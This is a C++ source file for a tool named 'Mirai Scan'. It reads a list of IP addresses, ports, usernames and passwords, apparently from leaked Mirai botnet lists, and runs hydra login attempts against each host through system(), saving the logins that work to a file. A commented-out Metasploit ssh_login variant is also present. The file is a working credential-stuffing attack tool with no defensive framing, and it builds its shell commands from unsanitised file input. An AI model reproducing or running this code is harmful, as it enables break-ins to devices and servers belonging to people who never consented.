#include <iostream>
#include <fstream>
#include <string>
#include <stdio.h>
#include <stdlib.h>
using namespace std;
int getSize(string);
int main(int argc, const char *argv[])
{
	system("clear");
	if(argc==1)
	{
		cout << "\n\nMirai Scan\n\nUsage : " << argv[0] << " HOSTFILE " << "SERVICE > cracked.txt \n\nMost mirai list are hosts running telnet or ssh\nHydra genorates warnings that will be displated to the screen but not the output.\nLEAVE THE SHELL OPEN" << endl;
		return 0;
	}
	//services listed below, Most mirai list or telnet:23 or ssh:22
	//adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp 
	string raw,ip,port,user,pass;
	string filename = argv[1];
	int filesize = getSize(filename);
	ifstream infile;
	infile.open(filename,ios::in);
	while(infile)
	{
		infile >> ip;
        	//cout << "ip: " << ip << endl;

		infile >> port;
                //cout << "port: " << port << endl;

		infile >> user;
                //cout << "user: " << user << endl;

		infile >> pass;
                //cout << "pass: " << pass << endl;
		//raw = "msfconsole -x 'use auxiliary/scanner/ssh/ssh_login;set RHOSTS " + ip + "; set RPORT " + port + "; set USERNAME " + user + "; set PASSWORD " + pass + ";'";
		//		metasploit did not work on my host. It is slow as well.
		//cout << raw << endl;
		//const char* com[5];
		raw = "hydra -I -l " + user + " -p " + pass + " -s " + port + " " + ip + " " + argv[2] + " -t 6 | grep -i 'host'"; //remove the pipe and everything proceading to see failed attempts
		system(raw.c_str());
		}
	cout << "~~~~~~~~~~~~~~FINISHED SCAN~~~~~~~~~~~~~~" << endl;
	return 0;
}
int getSize(string filename)
{
	ifstream infile(filename, ios::binary);
	infile.seekg(0, ios::end);
	cout << "Host file size: " << infile.tellg() << " bytes" << endl;
	return infile.tellg();
}
